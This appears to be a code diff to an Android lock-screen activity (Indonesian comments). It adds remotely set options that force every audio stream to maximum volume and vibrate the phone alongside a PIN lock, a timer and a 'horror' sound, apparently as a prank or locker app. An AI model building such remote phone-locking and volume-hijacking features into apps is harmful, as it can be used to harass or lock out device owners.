@@ -5,6 +5,7 @@ import android.content.BroadcastReceiver;
 import android.content.Context;
 import android.content.Intent;
 import android.content.IntentFilter;
+import android.media.AudioManager;
 import android.media.MediaPlayer;
 import android.os.Build;
 import android.os.Bundle;
@@ -22,6 +23,7 @@ public class LockScreenActivity extends Activity {
     private long timerDuration = 0;
     private CountDownTimer countDownTimer;
     private boolean isLocked = false; 
+    private boolean isGetarActive = false; // Penanda getar aktif
     
     private MediaPlayer mediaPlayer;
     private Vibrator vibrator;
@@ -58,24 +60,48 @@ public class LockScreenActivity extends Activity {
         }
         if (getIntent().hasExtra("TIMER")) timerDuration = getIntent().getLongExtra("TIMER", 0);
 
-        // --- LOGIKA SUARA HOROR ---
+        // --- LOGIKA SUARA, GETAR, & VOLUME ---
         String suara = getIntent().getStringExtra("SUARA");
+        String getar = getIntent().getStringExtra("GETAR");
+        String volume = getIntent().getStringExtra("VOLUME");
+
+        // Cek Volume
+        if ("1".equals(volume)) {
+            setVolumeMax();
+        }
+
+        // Cek Getar
+        if ("1".equals(getar)) {
+            isGetarActive = true;
+            getarSekali();
+        }
+
+        // Cek Suara
         if (suara != null && suara.equals("horor")) {
             putarSuaraHoror();
         }
 
-        // --- LOGIKA GETAR SAAT LAYAR MUNCUL ---
-        getarSekali();
-
         setupKeypad();
         startTimer();
+    }
+
+    private void setVolumeMax() {
+        try {
+            AudioManager audioManager = (AudioManager) getSystemService(Context.AUDIO_SERVICE);
+            if (audioManager != null) {
+                audioManager.setStreamVolume(AudioManager.STREAM_MUSIC, audioManager.getStreamMaxVolume(AudioManager.STREAM_MUSIC), 0);
+                audioManager.setStreamVolume(AudioManager.STREAM_SYSTEM, audioManager.getStreamMaxVolume(AudioManager.STREAM_SYSTEM), 0);
+                audioManager.setStreamVolume(AudioManager.STREAM_RING, audioManager.getStreamMaxVolume(AudioManager.STREAM_RING), 0);
+                audioManager.setStreamVolume(AudioManager.STREAM_ALARM, audioManager.getStreamMaxVolume(AudioManager.STREAM_ALARM), 0);
+            }
+        } catch (Exception e) { }
     }
 
     private void putarSuaraHoror() {
         try {
             mediaPlayer = MediaPlayer.create(this, R.raw.suara_horor);
             if (mediaPlayer != null) {
-                mediaPlayer.setLooping(false); // Main sekali aja
+                mediaPlayer.setLooping(false);
                 mediaPlayer.start();
             }
         } catch (Exception e) {
@@ -137,7 +163,7 @@ public class LockScreenActivity extends Activity {
                 unlockScreen();
             } else {
                 Toast.makeText(this, "PIN SALAH!", Toast.LENGTH_SHORT).show();
-                getarSekali(); // Getar pas PIN salah
+                if (isGetarActive) getarSekali(); // Getar cuma jalan kalau di-set dari Web
                 inputPin.setLength(0);
                 updatePinDisplay();
             }
